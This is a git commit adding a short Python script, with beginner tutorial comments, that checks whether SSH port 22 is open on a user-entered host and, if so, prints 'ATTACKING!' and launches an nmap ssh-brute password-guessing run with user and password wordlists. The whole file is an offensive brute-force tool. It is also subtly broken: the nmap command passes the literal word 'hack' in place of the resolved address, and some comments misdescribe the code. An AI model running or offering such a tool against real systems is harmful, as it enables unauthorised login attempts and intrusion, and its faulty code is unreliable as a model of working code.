1134916a78bab0dde568fee34a971507ebd88da0
Derek Johnston <101991363+usethisname1419@users.noreply.github.com>
2023-04-14 14:03:42 -0600

    Create altv2.py

---
+++ altv2.py
@@ -0,0 +1,57 @@
+import socket
+import sys
+import os
+from datetime import datetime
+
+############# Import Modules. Modules are installed by using " pip install (pkname)"###############
+#############Modules are other pieces if code available with python. very helpful to sav time##########
+target = input("enter ip address:  ")
+
+############## Saving input value as a variable####################
+hack = socket.gethostbyname(target)
+
+print(hack)
+print("Starting to get target information at: ")
+###################You can prin a variable or plain text###########3
+t1 = datetime.now()
+print(t1)
+##############We use the modules datime to print the current time#################
+
+def starthack():
+######################### Fuctions: def means Define. functions are called with the () characters##############
+    try:
+        port = 22
+####################### This is a loop, targeting all ports in that range.####################
+        hacking = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        hacking.settimeout(10)
+        result = hacking.connect_ex((hack, port))
+        if result ==0:
+            print("PORT:", port,"    OPEN")
+            print("ATTACKING!")
+            os.system(
+                'nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passes.txt \ --script-args ssh-brute.timeout=4s hack')
+            hacking.close()
+            print(t1)
+        else:
+            print("PORT:", port, "    CLOSED")
+            hacking.close()
+            print(t1)
+    except KeyboardInterrupt:
+        print(t1)
+        print("Canceled")
+        sys.exit()
+
+    except socket.gaierror:
+        print(t1)
+        print("Hostname could not be resolved. Exiting")
+        sys.exit()
+    except socket.error:
+        print(t1)
+        print("Error")
+        print("ERROR")
+        sys.exit()
+starthack()
+###########Calling a fuction##################33
+
+print("END OF REPORT")
+print("Corexital")
